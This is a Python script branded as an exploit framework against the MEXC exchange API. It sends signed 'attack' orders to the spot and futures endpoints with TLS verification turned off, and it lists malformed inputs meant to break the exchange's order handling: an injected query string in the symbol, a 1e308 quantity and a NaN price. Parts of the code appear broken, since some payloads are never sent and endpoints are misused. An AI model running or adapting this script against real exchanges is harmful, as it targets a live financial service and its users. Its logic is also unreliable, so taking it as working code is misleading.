#!/usr/bin/env python3
# MEXC Dual-Mode Zero-Balance Exploit Framework v10.0

import hmac
import hashlib
import requests
import time
import json
from urllib.parse import urlencode

class MEXCDualExploit:
    def __init__(self, api_key, api_secret):
        self.api_key = api_key
        self.api_secret = api_secret
        self.endpoints = {
            'spot': {
                'test_order': '/api/v3/order/test',
                'oco': '/api/v3/order/oco'
            },
            'futures': {
                'test_order': '/api/v1/private/order/test',
                'batch_orders': '/api/v1/private/order/batch'
            }
        }
        self._session = requests.Session()
        self._session.verify = False
        self._session.headers.update({
            'X-MEXC-APIKEY': self.api_key,
            'Content-Type': 'application/json'
        })

    def _sign(self, params):
        """Universal signature generator for both spot and futures"""
        params['timestamp'] = int(time.time() * 1000)
        query = urlencode(sorted(params.items()))
        return hmac.new(
            self.api_secret.encode(),
            query.encode(),
            hashlib.sha256
        ).hexdigest()

    def _attack_market(self, market_type, symbol):
        """Execute attacks on specified market type"""
        results = {}
        
        # Test Order Attack
        test_params = {
            'symbol': symbol,
            'side': 'BUY',
            'type': 'MARKET',
            'quantity': 0.001,
            'test': True
        }
        if market_type == 'futures':
            test_params.update({
                'leverage': 10,  # Futures-specific
                'positionSide': 'LONG'
            })
        
        test_params['signature'] = self._sign(test_params)
        test_resp = self._session.post(
            f"https://{'futures' if market_type == 'futures' else 'api'}.mexc.com{self.endpoints[market_type]['test_order']}",
            data=json.dumps(test_params)
        )
        results['test_order'] = {
            'status': test_resp.status_code,
            'response': test_resp.json(),
            'success': test_resp.status_code == 200
        }

        # Batch/Bulk Order Attack
        bulk_params = {
            'batchOrders': json.dumps([{
                'symbol': symbol,
                'side': 'BUY',
                'type': 'LIMIT',
                'quantity': 0.001,
                'price': "0.01",  # Impossible price
                'test': True
            } for _ in range(3)])
        }
        if market_type == 'futures':
            bulk_params['batchOrders'] = json.dumps([{
                **order,
                'leverage': 10,
                'positionSide': 'SHORT'
            } for order in json.loads(bulk_params['batchOrders'])])

        bulk_params['signature'] = self._sign(bulk_params)
        bulk_resp = self._session.post(
            f"https://{'futures' if market_type == 'futures' else 'api'}.mexc.com{self.endpoints[market_type]['oco' if market_type == 'spot' else 'batch_orders']}",
            data=json.dumps(bulk_params)
        )
        results['bulk_attack'] = {
            'status': bulk_resp.status_code,
            'response': bulk_resp.json(),
            'success': bulk_resp.status_code == 200
        }

        return results

    def execute_dual_attack(self, symbol):
        """Attack both spot and futures markets"""
        return {
            'spot': self._attack_market('spot', symbol),
            'futures': self._attack_market('futures', symbol),
            'common_exploits': [
                {"symbol": f"{symbol}?test=true", "quantity": "1e308"},
                {"timeInForce": "GTX", "price": "NaN"},
                {"side": "BUY", "type": "MARKET", "quantity": "0.001", "test": "true"}
            ]
        }

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='MEXC Dual-Mode Exploit v10.0')
    parser.add_argument('--api-key', required=True)
    parser.add_argument('--api-secret', required=True)
    parser.add_argument('--symbol', default='BTCUSDT')
    args = parser.parse_args()

    print("""
    ███╗   ███╗███████╗██╗  ██╗ ██████╗    ██████╗ ██╗   ██╗ █████╗ ██╗     
    ████╗ ████║██╔════╝╚██╗██╔╝██╔════╝    ██╔══██╗██║   ██║██╔══██╗██║     
    ██╔████╔██║█████╗   ╚███╔╝ ██║  ███╗   ██║  ██║██║   ██║███████║██║     
    ██║╚██╔╝██║██╔══╝   ██╔██╗ ██║   ██║   ██║  ██║╚██╗ ██╔╝██╔══██║██║     
    ██║ ╚═╝ ██║███████╗██╔╝ ██╗╚██████╔╝   ██████╔╝ ╚████╔╝ ██║  ██║███████╗
    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚══════╝
    DUAL-MODE ZERO-BALANCE EXPLOIT FRAMEWORK v10.0
    """)

    attacker = MEXCDualExploit(args.api_key, args.api_secret)
    results = attacker.execute_dual_attack(args.symbol)
    
    print("\n🔥 DUAL-MODE EXPLOIT RESULTS 🔥")
    print(json.dumps(results, indent=2, sort_keys=True))

    print("\n💀 EXPLOIT SUMMARY:")
    for market in ['spot', 'futures']:
        print(f"\n🔹 {market.upper()} MARKET:")
        for test in ['test_order', 'bulk_attack']:
            status = "✅ SUCCESS" if results[market][test]['success'] else "❌ FAILED"
            print(f"{status} - {test.replace('_', ' ').upper()}")
